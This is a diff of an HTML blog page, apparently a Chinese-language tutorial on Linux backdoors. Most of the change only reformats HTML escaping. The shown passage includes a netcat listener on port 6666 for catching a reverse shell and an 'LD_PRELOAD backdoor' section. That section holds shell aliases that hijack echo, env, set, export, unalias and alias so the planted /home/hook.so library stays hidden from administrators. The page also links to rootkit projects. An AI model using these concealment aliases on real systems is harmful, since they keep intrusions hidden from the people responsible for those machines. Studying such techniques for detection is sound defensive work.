-&#x2F;&#x2F;  攻击机监听6666端口并获取反弹的shell
+//  攻击机监听6666端口并获取反弹的shell
 
-nc -lvnp 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+nc -lvnp 6666
+</code></pre>
+<h2 id="0x06-LD-PRELOAD-后门"><a href="#0x06-LD-PRELOAD-后门" class="headerlink" title="0x06 LD_PRELOAD 后门"></a>0x06 LD_PRELOAD 后门</h2><h3 id="环境变量隐藏"><a href="#环境变量隐藏" class="headerlink" title="环境变量隐藏"></a>环境变量隐藏</h3><pre><code>1) echo $LD_PRELOAD 
 
-<h2 id="0x06-LD-PRELOAD-后门"><a href="#0x06-LD-PRELOAD-后门" class="headerlink" title="0x06 LD_PRELOAD 后门"></a>0x06 LD_PRELOAD 后门</h2><h3 id="环境变量隐藏"><a href="#环境变量隐藏" class="headerlink" title="环境变量隐藏"></a>环境变量隐藏</h3><pre class="line-numbers language-none"><code class="language-none">1) echo $LD_PRELOAD 
-
-alias echo&#x3D;&#39;func()&#123; echo $* | sed &quot;s!&#x2F;home&#x2F;hook.so! !g&quot;;&#125;;func&#39;
+alias echo=&#39;func()&#123; echo $* | sed &quot;s!/home/hook.so! !g&quot;;&#125;;func&#39;
 
 2) env
 
-alias env&#x3D;&#39;func()&#123; env $* | grep -v &quot;&#x2F;home&#x2F;hook.so&quot;;&#125;;func&#39;
+alias env=&#39;func()&#123; env $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#39;
 
 3) set 
 
-alias set&#x3D;&#39;func()&#123; set $* | grep -v &quot;&#x2F;home&#x2F;hook.so&quot;;&#125;;func&#39;
+alias set=&#39;func()&#123; set $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#39;
 
 4) export 
 
-alias export&#x3D;&#39;func()&#123; export $* | grep -v &quot;&#x2F;home&#x2F;hook.so&quot;;&#125;;func&#39;
+alias export=&#39;func()&#123; export $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#39;
 
 5) unalias劫持
 
-alias unalias&#x3D;&#39;func()&#123; if [ $# !&#x3D; 0 ]; then if [ $* !&#x3D; &quot;echo&quot; ]&amp;&amp;[ $* !&#x3D; &quot;env&quot; ]&amp;&amp;[ $* !&#x3D; &quot;set&quot; ]&amp;&amp;[ $* !&#x3D; &quot;export&quot; ]&amp;&amp;[ $* !&#x3D; &quot;alias&quot; ]&amp;&amp;[ $* !&#x3D; &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;func&#39;
+alias unalias=&#39;func()&#123; if [ $# != 0 ]; then if [ $* != &quot;echo&quot; ]&amp;&amp;[ $* != &quot;env&quot; ]&amp;&amp;[ $* != &quot;set&quot; ]&amp;&amp;[ $* != &quot;export&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;func&#39;
 
 6) alias劫持
 
-alias alias&#x3D;&#39;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v hook.so;&#125;;func&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+alias alias=&#39;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v hook.so;&#125;;func&#39;
+</code></pre>
 <h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/mempodippy/cub3">https://github.com/mempodippy/cub3</a> </li>
 <li><a target="_blank" rel="noopener" href="https://github.com/mempodippy/vlany">https://github.com/mempodippy/vlany</a></li>
